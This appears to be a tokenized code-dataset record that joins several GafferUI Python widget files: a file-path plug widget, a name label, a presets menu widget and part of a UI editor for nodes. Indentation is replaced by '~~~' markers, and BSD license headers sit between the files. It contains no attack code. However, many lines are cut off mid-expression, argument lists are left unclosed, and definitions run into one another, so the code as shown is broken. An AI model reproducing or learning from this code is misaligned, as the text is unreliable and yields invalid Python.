#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
import Gaffer \n 
import GafferUI \n 
\n 
## Supported plug metadata : \n 
# \n 
# - "fileSystemPathPlugValueWidget:extensions" \n 
# - "fileSystemPathPlugValueWidget:extensionsLabel" \n 
# - "fileSystemPathPlugValueWidget:includeSequences" \n 
# - "fileSystemPathPlugValueWidget:includeSequenceFrameRange" \n 
#\tNote that includeSequenceFrameRange is primarily used \n 
#\tby GafferCortex. Think twice before using it elsewhere \n 
#\tas it may not exist in the future. \n 
class FileSystemPathPlugValueWidget ( GafferUI . PathPlugValueWidget ) : \n 
\n 
~~~ def __init__ ( self , plug , path = None , parenting = None ) : \n 
\n 
~~~ GafferUI . PathPlugValueWidget . __init__ ( \n 
self , \n 
plug , \n 
path , \n 
parenting = parenting \n 
) \n 
\n 
self . _updateFromPlug ( ) \n 
\n 
self . __plugMetadataChangedConnection = Gaffer . Metadata . plugValueChangedSignal ( ) . connect ( Gaffer . WeakMethod \n 
~~ def getToolTip ( self ) : \n 
\n 
~~~ result = GafferUI . PathPlugValueWidget . getToolTip ( self ) \n 
\n 
extensions = self . __extensions ( ) \n 
if extensions : \n 
~~~ result += "\\n\\nSupported file extensions : " + ", " . join ( extensions ) \n 
\n 
~~ return result \n 
\n 
~~ def _pathChooserDialogue ( self ) : \n 
\n 
~~~ dialogue = GafferUI . PathPlugValueWidget . _pathChooserDialogue ( self ) \n 
\n 
if Gaffer . Metadata . plugValue ( self . getPlug ( ) , "fileSystemPathPlugValueWidget:includeSequences" ) : \n 
~~~ columns = dialogue . pathChooserWidget ( ) . pathListingWidget ( ) . getColumns ( ) \n 
columns . append ( GafferUI . PathListingWidget . StandardColumn ( "Frame Range" , "fileSystem:frameRange" dialogue . pathChooserWidget ( ) . pathListingWidget ( ) . setColumns ( columns ) \n 
\n 
~~ return dialogue \n 
\n 
~~ def _updateFromPlug ( self ) : \n 
\n 
~~~ GafferUI . PathPlugValueWidget . _updateFromPlug ( self ) \n 
\n 
includeSequences = Gaffer . Metadata . plugValue ( self . getPlug ( ) , "fileSystemPathPlugValueWidget:includeSequences" \n 
self . path ( ) . setFilter ( \n 
Gaffer . FileSystemPath . createStandardFilter ( \n 
self . __extensions ( ) , \n 
Gaffer . Metadata . plugValue ( self . getPlug ( ) , "fileSystemPathPlugValueWidget:extensionsLabel" ) or includeSequenceFilter = includeSequences , \n 
) \n 
) \n 
\n 
self . path ( ) . setIncludeSequences ( includeSequences ) \n 
\n 
~~ def _setPlugFromPath ( self , path ) : \n 
\n 
~~~ if Gaffer . Metadata . plugValue ( self . getPlug ( ) , "fileSystemPathPlugValueWidget:includeSequenceFrameRange" ~~~ sequence = path . fileSequence ( ) \n 
if sequence : \n 
~~~ self . getPlug ( ) . setValue ( str ( sequence ) ) \n 
return \n 
\n 
~~ ~~ GafferUI . PathPlugValueWidget . _setPlugFromPath ( self , path ) \n 
\n 
~~ def __plugMetadataChanged ( self , nodeTypeId , plugPath , key , plug ) : \n 
\n 
~~~ if self . getPlug ( ) is None : \n 
~~~ return \n 
\n 
~~ if plug is not None and not plug . isSame ( self . getPlug ( ) ) : \n 
~~~ return \n 
\n 
~~ if not self . getPlug ( ) . node ( ) . isInstanceOf ( nodeTypeId ) : \n 
~~~ return \n 
\n 
~~ if key . startswith ( "fileSystemPathPlugValueWidget:" ) : \n 
~~~ self . _updateFromPlug ( ) \n 
\n 
~~ ~~ def __extensions ( self ) : \n 
\n 
~~~ if self . getPlug ( ) is None : \n 
~~~ return [ ] \n 
\n 
~~ extensions = Gaffer . Metadata . plugValue ( self . getPlug ( ) , "fileSystemPathPlugValueWidget:extensions" if isinstance ( extensions , str ) : \n 
~~~ extensions = extensions . split ( ) \n 
~~ else : \n 
~~~ extensions = list ( extensions ) \n 
\n 
~~ return extensions \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2013, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
~~ ~~ import IECore \n 
\n 
import Gaffer \n 
import GafferUI \n 
\n 
## The NameLabel class displays a label which is kept in sync with the name of \n 
# a particular GraphComponent. The label acts as a drag source for dragging the \n 
# GraphComponent to another widget. \n 
class NameLabel ( GafferUI . Label ) : \n 
\n 
~~~ def __init__ ( self , graphComponent , horizontalAlignment = GafferUI . Label . HorizontalAlignment . Left , verticalAlignment \n 
~~~ GafferUI . Label . __init__ ( self , "" , horizontalAlignment , verticalAlignment , parenting = parenting ) \n 
self . __formatter = formatter if formatter is not None else self . defaultFormatter \n 
self . __numComponents = numComponents \n 
\n 
self . __connections = [ ] \n 
self . __graphComponent = False # force setGraphComponent() to update no matter what \n 
self . setGraphComponent ( graphComponent ) \n 
\n 
self . __buttonPressConnection = self . buttonPressSignal ( ) . connect ( Gaffer . WeakMethod ( self . __buttonPress self . __dragBeginConnection = self . dragBeginSignal ( ) . connect ( Gaffer . WeakMethod ( self . __dragBegin ) self . __dragEndConnection = self . dragEndSignal ( ) . connect ( Gaffer . WeakMethod ( self . __dragEnd ) ) \n 
\n 
## Calling setText() disables the name tracking behaviour. \n 
## \\deprecated. Use a custom formatter to override the text. \n 
~~ def setText ( self , text ) : \n 
\n 
~~~ GafferUI . Label . setText ( self , text ) \n 
\n 
self . __connections = [ ] \n 
\n 
~~ def setGraphComponent ( self , graphComponent ) : \n 
\n 
~~~ if graphComponent is not None and self . __graphComponent is not False : \n 
~~~ if graphComponent . isSame ( self . __graphComponent ) : \n 
~~~ return \n 
~~ ~~ elif self . __graphComponent is None : \n 
~~~ return \n 
\n 
~~ self . __graphComponent = graphComponent \n 
self . __setupConnections ( ) \n 
self . __setText ( ) \n 
\n 
~~ def getGraphComponent ( self ) : \n 
\n 
~~~ return self . __graphComponent \n 
\n 
## Specifies how many levels of the hierarchy to be displayed in \n 
# the name. A value of 1 shows only the name of getGraphComponent(). \n 
# A value of 2 also shows the parent name, and so on. Use setFormatter() \n 
# if you wish to customise how these names are displayed. \n 
~~ def setNumComponents ( self , numComponents ) : \n 
\n 
~~~ assert ( numComponents > 0 ) \n 
\n 
if numComponents == self . __numComponents : \n 
~~~ return \n 
\n 
~~ self . __numComponents = numComponents \n 
self . __setupConnections ( ) \n 
self . __setText ( ) \n 
\n 
~~ def getNumComponents ( self ) : \n 
\n 
~~~ return self . __numComponents \n 
\n 
## Specifies a function which is passed a list of GraphComponents \n 
# and returns a string containing their names. This function will \n 
# be used to generate the label text. \n 
~~ def setFormatter ( self , formatter ) : \n 
\n 
~~~ self . __formatter = formatter \n 
self . __setText ( ) \n 
\n 
~~ def getFormatter ( self ) : \n 
\n 
~~~ return self . __formatter \n 
\n 
~~ @ staticmethod \n 
def defaultFormatter ( graphComponents ) : \n 
\n 
~~~ return "." . join ( IECore . CamelCase . toSpaced ( g . getName ( ) ) for g in graphComponents ) \n 
\n 
~~ def __setupConnections ( self , reuseUntil = None ) : \n 
\n 
~~~ if self . __graphComponent is None : \n 
~~~ self . __connections = [ ] \n 
return \n 
\n 
# when a parent has changed somewhere in the hierarchy, \n 
# we only need to make new connections for the components \n 
# for the new parent and its ancestors - the connections for \n 
# components below the parent can be reused. this might seem \n 
\n 
# critical - we are called from within __parentChanged( someComponent ) \n 
# and if were to reconnect __parentChanged to someComponent \n 
# here, __parentChanged would be called again immediately, \n 
# resulting in an infinite loop. our updatedConnections will \n 
# be a mix of reused connections and newly created ones. \n 
\n 
~~ updatedConnections = [ ] \n 
\n 
n = 0 \n 
g = self . __graphComponent \n 
reuse = reuseUntil is not None \n 
while g is not None and n < self . __numComponents : \n 
~~~ if reuse : \n 
~~~ updatedConnections . extend ( self . __connections [ n * 2 : n * 2 + 2 ] ) \n 
~~ else : \n 
~~~ updatedConnections . append ( g . nameChangedSignal ( ) . connect ( Gaffer . WeakMethod ( self . __setText ) ) if n < self . __numComponents - 1 : \n 
~~~ updatedConnections . append ( g . parentChangedSignal ( ) . connect ( Gaffer . WeakMethod ( self . __parentChanged \n 
~~ ~~ if g . isSame ( reuseUntil ) : \n 
~~~ reuse = False \n 
\n 
~~ g = g . parent ( ) \n 
n += 1 \n 
\n 
~~ self . __connections = updatedConnections \n 
\n 
~~ def __parentChanged ( self , child , oldParent ) : \n 
\n 
~~~ self . __setText ( ) \n 
self . __setupConnections ( reuseUntil = child ) \n 
\n 
~~ def __setText ( self , * unwantedArgs ) : \n 
\n 
~~~ graphComponents = [ ] \n 
\n 
n = 0 \n 
g = self . __graphComponent \n 
while g is not None and n < self . __numComponents : \n 
~~~ graphComponents . append ( g ) \n 
g = g . parent ( ) \n 
n += 1 \n 
\n 
~~ graphComponents . reverse ( ) \n 
GafferUI . Label . setText ( self , self . __formatter ( graphComponents ) ) \n 
\n 
~~ def __buttonPress ( self , widget , event ) : \n 
\n 
~~~ return self . getGraphComponent ( ) is not None and event . buttons & ( event . Buttons . Left | event . Buttons \n 
~~ def __dragBegin ( self , widget , event ) : \n 
\n 
~~~ if event . buttons & ( event . Buttons . Left | event . Buttons . Middle ) : \n 
~~~ GafferUI . Pointer . setCurrent ( "nodes" ) \n 
return self . getGraphComponent ( ) \n 
\n 
~~ return None \n 
\n 
~~ def __dragEnd ( self , widget , event ) : \n 
\n 
~~~ GafferUI . Pointer . setCurrent ( None ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2014, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
~~ ~~ import functools \n 
\n 
import IECore \n 
\n 
import Gaffer \n 
import GafferUI \n 
\n 
class PresetsPlugValueWidget ( GafferUI . PlugValueWidget ) : \n 
\n 
~~~ def __init__ ( self , plug , parenting = None ) : \n 
\n 
~~~ self . __menuButton = GafferUI . MenuButton ( "" , menu = GafferUI . Menu ( Gaffer . WeakMethod ( self . __menuDefinition GafferUI . PlugValueWidget . __init__ ( self , self . __menuButton , plug , parenting = parenting ) \n 
\n 
self . __plugMetadataChangedConnection = Gaffer . Metadata . plugValueChangedSignal ( ) . connect ( Gaffer . WeakMethod \n 
self . _addPopupMenu ( self . __menuButton ) \n 
self . _updateFromPlug ( ) \n 
\n 
~~ def _updateFromPlug ( self ) : \n 
\n 
~~~ self . __menuButton . setEnabled ( self . _editable ( ) ) \n 
\n 
text = "" \n 
if self . getPlug ( ) is not None : \n 
~~~ with self . getContext ( ) : \n 
~~~ text = Gaffer . NodeAlgo . currentPreset ( self . getPlug ( ) ) or "Invalid" \n 
\n 
~~ ~~ self . __menuButton . setText ( text ) \n 
\n 
~~ def __menuDefinition ( self ) : \n 
\n 
~~~ result = IECore . MenuDefinition ( ) \n 
if self . getPlug ( ) is None : \n 
~~~ return result \n 
\n 
~~ currentPreset = Gaffer . NodeAlgo . currentPreset ( self . getPlug ( ) ) \n 
for n in Gaffer . NodeAlgo . presets ( self . getPlug ( ) ) : \n 
~~~ result . append ( \n 
"/" + n , \n 
{ \n 
"command" : functools . partial ( Gaffer . WeakMethod ( self . __applyPreset ) , preset = n ) , \n 
"checkBox" : n == currentPreset , \n 
} \n 
) \n 
\n 
~~ return result \n 
\n 
~~ def __applyPreset ( self , unused , preset ) : \n 
\n 
~~~ with Gaffer . UndoContext ( self . getPlug ( ) . ancestor ( Gaffer . ScriptNode ) ) : \n 
~~~ Gaffer . NodeAlgo . applyPreset ( self . getPlug ( ) , preset ) \n 
\n 
~~ ~~ def __plugMetadataChanged ( self , nodeTypeId , plugPath , key , plug ) : \n 
\n 
~~~ if self . getPlug ( ) is None : \n 
~~~ return \n 
\n 
~~ if plug is not None and not plug . isSame ( self . getPlug ( ) ) : \n 
~~~ return \n 
\n 
~~ if not self . getPlug ( ) . node ( ) . isInstanceOf ( nodeTypeId ) : \n 
~~~ return \n 
\n 
~~ if key . startswith ( "preset:" ) : \n 
~~~ self . _updateFromPlug ( ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2014, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
~~ ~~ ~~ import weakref \n 
import functools \n 
import types \n 
import re \n 
import collections \n 
\n 
import IECore \n 
\n 
import Gaffer \n 
import GafferUI \n 
\n 
## The UIEditor class allows the user to edit the interfaces for nodes. \n 
class UIEditor ( GafferUI . NodeSetEditor ) : \n 
\n 
~~~ def __init__ ( self , scriptNode , parenting = None ) : \n 
\n 
~~~ self . __frame = GafferUI . Frame ( borderWidth = 4 , borderStyle = GafferUI . Frame . BorderStyle . None ) \n 
\n 
GafferUI . NodeSetEditor . __init__ ( self , self . __frame , scriptNode , parenting = parenting ) \n 
\n 
\n 
# perform the connections in _updateFromSet(). \n 
###################################################################### \n 
\n 
self . __nodeMetadataWidgets = [ ] \n 
self . __plugMetadataWidgets = [ ] \n 
\n 
with self . __frame : \n 
~~~ self . __tabbedContainer = GafferUI . TabbedContainer ( ) \n 
\n 
~~ with self . __tabbedContainer : \n 
\n 
# Node tab \n 
~~~ with GafferUI . ListContainer ( spacing = 4 , borderWidth = 8 , parenting = { "label" : "Node" } ) as \n 
~~~ with _Row ( ) : \n 
\n 
~~~ _Label ( "Name" ) \n 
\n 
self . __nodeNameWidget = GafferUI . NameWidget ( None ) \n 
\n 
~~ with _Row ( ) : \n 
\n 
~~~ _Label ( "Description" , parenting = { "verticalAlignment" : GafferUI . ListContainer . VerticalAlignment \n 
self . __nodeMetadataWidgets . append ( \n 
_MultiLineStringMetadataWidget ( key = "description" ) \n 
) \n 
\n 
~~ with _Row ( ) : \n 
\n 
~~~ _Label ( "Color" ) \n 
\n 
self . __nodeMetadataWidgets . append ( \n 
_ColorSwatchMetadataWidget ( key = "nodeGadget:color" ) \n 
) \n 
\n 
# Plugs tab \n 
~~ ~~ with GafferUI . SplitContainer ( orientation = GafferUI . SplitContainer . Orientation . Horizontal , borderWidth \n 
~~~ self . __plugListing = _PlugListing ( ) \n 
self . __plugListingSelectionChangedConnection = self . __plugListing . selectionChangedSignal ( ) . connect \n 
with GafferUI . TabbedContainer ( ) as self . __plugAndSectionEditorsContainer : \n 
\n 
~~~ self . __plugEditor = _PlugEditor ( ) \n 
self . __sectionEditor = _SectionEditor ( ) \n 
self . __sectionEditorNameChangedConnection = self . __sectionEditor . nameChangedSignal ( ) . connect ( Gaffer \n 
~~ self . __plugAndSectionEditorsContainer . setTabsVisible ( False ) \n 
\n 
~~ self . __plugTab . setSizes ( [ 0.3 , 0.7 ] ) \n 
\n 
# initialise our selection to nothing \n 
\n 
~~ self . __node = None \n 
self . __selectedPlug = None \n 
\n 
# call __updateFromSetInternal() to populate our selection and connect \n 
# the ui to it. we pass lazy==False to avoid the early out if \n 
# there is no currently selected node. \n 
\n 
self . __updateFromSetInternal ( lazy = False ) \n 
\n 
# Selection can be None, a Plug, or the name of a section. \n 
~~ def setSelection ( self , selection ) : \n 
\n 
~~~ self . __plugListing . setSelection ( selection ) \n 
\n 
~~ def getSelection ( self ) : \n 
\n 
~~~ return self . __plugListing . getSelection ( ) \n 
\n 
## Returns the widget layout responsible for editing the node as a whole. \n 
~~ def nodeEditor ( self ) : \n 
\n 
~~~ return self . __nodeTab \n 
\n 
## Returns the widget layout responsible for editing individual plugs. \n 
~~ def plugEditor ( self ) : \n 
\n 
~~~ return self . __plugTab \n 
\n 
~~ @ classmethod \n 
def appendNodeContextMenuDefinitions ( cls , nodeGraph , node , menuDefinition ) : \n 
\n 
~~~ menuDefinition . append ( "/UIEditorDivider" , { "divider" : True } ) \n 
menuDefinition . append ( "/Set Color..." , { "command" : functools . partial ( cls . __setColor , node = node \n 
~~ @ classmethod \n 
def appendNodeEditorToolMenuDefinitions ( cls , nodeEditor , node , menuDefinition ) : \n 
\n 
~~~ menuDefinition . append ( \n 
"/Edit UI..." , \n 
{ \n 
"command" : functools . partial ( GafferUI . UIEditor . acquire , node ) , \n 
"active" : isinstance ( node , Gaffer . Box ) or nodeEditor . nodeUI ( ) . plugValueWidget ( node [ "user" ] ) } \n 
) \n 
\n 
~~ def _updateFromSet ( self ) : \n 
\n 
~~~ GafferUI . NodeSetEditor . _updateFromSet ( self ) \n 
\n 
self . __updateFromSetInternal ( ) \n 
\n 
~~ def __updateFromSetInternal ( self , lazy = True ) : \n 
\n 
~~~ node = self . _lastAddedNode ( ) \n 
\n 
if lazy and node == self . __node : \n 
~~~ return \n 
\n 
~~ self . __node = node \n 
self . __nodeNameWidget . setGraphComponent ( self . __node ) \n 
self . __nodeTab . setEnabled ( self . __node is not None ) \n 
\n 
if self . __node is None : \n 
~~~ self . __plugListing . setPlugParent ( None ) \n 
self . __sectionEditor . setPlugParent ( None ) \n 
~~ else : \n 
~~~ plugParent = self . __node [ "user" ] \n 
if isinstance ( self . __node , Gaffer . Box ) : \n 
# For Boxes we want the user to edit the plugs directly \n 
# parented to the Box, because that is where promoted plugs go, \n 
# and because we want to leave the "user" plug empty so that it \n 
# is available for use by the user on Reference nodes once a Box has \n 
# been exported and referenced. \n 
~~~ plugParent = self . __node \n 
~~ self . __plugListing . setPlugParent ( plugParent ) \n 
self . __sectionEditor . setPlugParent ( plugParent ) \n 
\n 
~~ for widget in self . __nodeMetadataWidgets : \n 
~~~ widget . setTarget ( self . __node ) \n 
\n 
~~ self . setSelection ( None ) \n 
\n 
~~ def __plugListingSelectionChanged ( self , listing ) : \n 
\n 
~~~ selection = listing . getSelection ( ) \n 
if selection is None or isinstance ( selection , Gaffer . Plug ) : \n 
~~~ self . __plugEditor . setPlug ( selection ) \n 
self . __plugAndSectionEditorsContainer . setCurrent ( self . __plugEditor ) \n 
~~ elif isinstance ( selection , basestring ) : \n 
~~~ self . __plugEditor . setPlug ( None ) \n 
self . __sectionEditor . setSection ( selection ) \n 
self . __plugAndSectionEditorsContainer . setCurrent ( self . __sectionEditor ) \n 
\n 
~~ ~~ def __sectionEditorNameChanged ( self , sectionEditor , oldName , newName ) : \n 
\n 
# When the name changed, our plug listing will have lost its \n 
# selection. So give it a helping hand. \n 
~~~ self . __plugListing . setSelection ( newName ) \n 
\n 
~~ def __repr__ ( self ) : \n 
\n 
~~~ return "GafferUI.UIEditor( scriptNode )" \n 
\n 
~~ @ classmethod \n 
def __setColor ( cls , menu , node ) : \n 
\n 
~~~ color = Gaffer . Metadata . nodeValue ( node , "nodeGadget:color" ) or IECore . Color3f ( 1 ) \n 
dialogue = GafferUI . ColorChooserDialogue ( color = color , useDisplayTransform = False ) \n 
color = dialogue . waitForColor ( parentWindow = menu . ancestor ( GafferUI . Window ) ) \n 
if color is not None : \n 
~~~ with Gaffer . UndoContext ( node . ancestor ( Gaffer . ScriptNode ) ) : \n 
~~~ Gaffer . Metadata . registerNodeValue ( node , "nodeGadget:color" , color ) \n 
\n 
~~ ~~ ~~ ~~ GafferUI . EditorWidget . registerType ( "UIEditor" , UIEditor ) \n 
\n 
########################################################################## \n 
# PlugValueWidget popup menu \n 
########################################################################## \n 
\n 
def __editPlugUI ( node , plug ) : \n 
\n 
~~~ editor = GafferUI . UIEditor . acquire ( node ) \n 
editor . setSelection ( plug ) \n 
editor . plugEditor ( ) . reveal ( ) \n 
\n 
~~ def __plugPopupMenu ( menuDefinition , plugValueWidget ) : \n 
\n 
~~~ plug = plugValueWidget . getPlug ( ) \n 
node = plug . node ( ) \n 
if node is None : \n 
~~~ return \n 
\n 
~~ if isinstance ( node , Gaffer . Box ) : \n 
~~~ if not plug . parent ( ) . isSame ( node ) : \n 
~~~ return \n 
~~ ~~ else : \n 
~~~ if not plug . parent ( ) . isSame ( node [ "user" ] ) : \n 
~~~ return \n 
\n 
~~ ~~ menuDefinition . append ( "/EditUIDivider" , { "divider" : True } ) \n 
menuDefinition . append ( "/Edit UI..." , { "command" : IECore . curry ( __editPlugUI , node , plug ) , "active" \n 
~~ __plugPopupMenuConnection = GafferUI . PlugValueWidget . popupMenuSignal ( ) . connect ( __plugPopupMenu ) \n 
\n 
########################################################################## \n 
# Simple fixed width label and row classes \n 
########################################################################## \n 
\n 
class _Label ( GafferUI . Label ) : \n 
\n 
~~~ def __init__ ( self , * args , ** kw ) : \n 
\n 
~~~ GafferUI . Label . __init__ ( \n 
self , \n 
horizontalAlignment = GafferUI . Label . HorizontalAlignment . Right , \n 
* args , ** kw \n 
) \n 
\n 
self . _qtWidget ( ) . setFixedWidth ( 110 ) \n 
\n 
~~ ~~ class _Row ( GafferUI . ListContainer ) : \n 
\n 
~~~ def __init__ ( self , * args , ** kw ) : \n 
\n 
~~~ GafferUI . ListContainer . __init__ ( self , GafferUI . ListContainer . Orientation . Horizontal , spacing = 4 , \n 
########################################################################## \n 
# MetadataValueWidgets. These display metadata values, allowing the user \n 
# to edit them. \n 
########################################################################## \n 
\n 
~~ ~~ class _MetadataWidget ( GafferUI . Widget ) : \n 
\n 
~~~ def __init__ ( self , topLevelWidget , key , target = None , parenting = None ) : \n 
\n 
~~~ GafferUI . Widget . __init__ ( self , topLevelWidget , parenting = parenting ) \n 
\n 
self . __key = key \n 
self . __target = None \n 
\n 
self . setTarget ( target ) \n 
\n 
~~ def setTarget ( self , target ) : \n 
\n 
~~~ assert ( isinstance ( target , ( Gaffer . Node , Gaffer . Plug , type ( None ) ) ) ) \n 
\n 
self . __target = target \n 
self . setEnabled ( self . __target is not None ) \n 
\n 
if isinstance ( self . __target , Gaffer . Node ) : \n 
~~~ self . __metadataChangedConnection = Gaffer . Metadata . nodeValueChangedSignal ( ) . connect ( \n 
Gaffer . WeakMethod ( self . __nodeMetadataChanged ) \n 
) \n 
~~ elif isinstance ( self . __target , Gaffer . Plug ) : \n 
~~~ self . __metadataChangedConnection = Gaffer . Metadata . plugValueChangedSignal ( ) . connect ( \n 
Gaffer . WeakMethod ( self . __plugMetadataChanged ) \n 
) \n 
~~ else : \n 
~~~ self . __metadataChangedConnection = None \n 
\n 
~~ self . __update ( ) \n 
\n 
~~ def getTarget ( self ) : \n 
\n 
~~~ return self . __target \n 
\n 
~~ def setKey ( self , key ) : \n 
\n 
~~~ if key == self . __key : \n 
~~~ return \n 
\n 
~~ self . __key = key \n 
self . __update ( ) \n 
\n 
~~ def getKey ( self , key ) : \n 
\n 
~~~ return self . __key \n 
\n 
## Must be implemented in derived classes to update \n 
# the widget from the value. \n 
~~ def _updateFromValue ( self , value ) : \n 
\n 
~~~ raise NotImplementedError \n 
\n 
## Must be called by derived classes to update \n 
# the Metadata value when the widget value changes. \n 
~~ def _updateFromWidget ( self , value ) : \n 
\n 
~~~ if self . __target is None : \n 
~~~ return \n 
\n 
~~ with Gaffer . UndoContext ( self . __target . ancestor ( Gaffer . ScriptNode ) ) : \n 
~~~ _registerMetadata ( self . __target , self . __key , value ) \n 
\n 
## May be called by derived classes to deregister the \n 
# metadata value. \n 
~~ ~~ def _deregisterValue ( self ) : \n 
\n 
~~~ if self . __target is None : \n 
~~~ return \n 
\n 
~~ with Gaffer . UndoContext ( self . __target . ancestor ( Gaffer . ScriptNode ) ) : \n 
~~~ _deregisterMetadata ( self . __target , self . __key ) \n 
\n 
~~ ~~ def __update ( self ) : \n 
\n 
~~~ if isinstance ( self . __target , Gaffer . Node ) : \n 
~~~ self . _updateFromValue ( Gaffer . Metadata . nodeValue ( self . __target , self . __key ) ) \n 
~~ elif isinstance ( self . __target , Gaffer . Plug ) : \n 
~~~ self . _updateFromValue ( Gaffer . Metadata . plugValue ( self . __target , self . __key ) ) \n 
~~ else : \n 
~~~ self . _updateFromValue ( None ) \n 
\n 
~~ ~~ def __nodeMetadataChanged ( self , nodeTypeId , key , node ) : \n 
\n 
~~~ if self . __key != key : \n 
~~~ return \n 
~~ if node is not None and not node . isSame ( self . __target ) : \n 
~~~ return \n 
~~ if not self . __target . isInstanceOf ( nodeTypeId ) : \n 
~~~ return \n 
\n 
~~ self . __update ( ) \n 
\n 
~~ def __plugMetadataChanged ( self , nodeTypeId , plugPath , key , plug ) : \n 
\n 
~~~ if self . __key != key : \n 
~~~ return \n 
~~ if plug is not None and not plug . isSame ( self . __target ) : \n 
~~~ return \n 
~~ if not self . __target . node ( ) . isInstanceOf ( nodeTypeId ) : \n 
~~~ return \n 
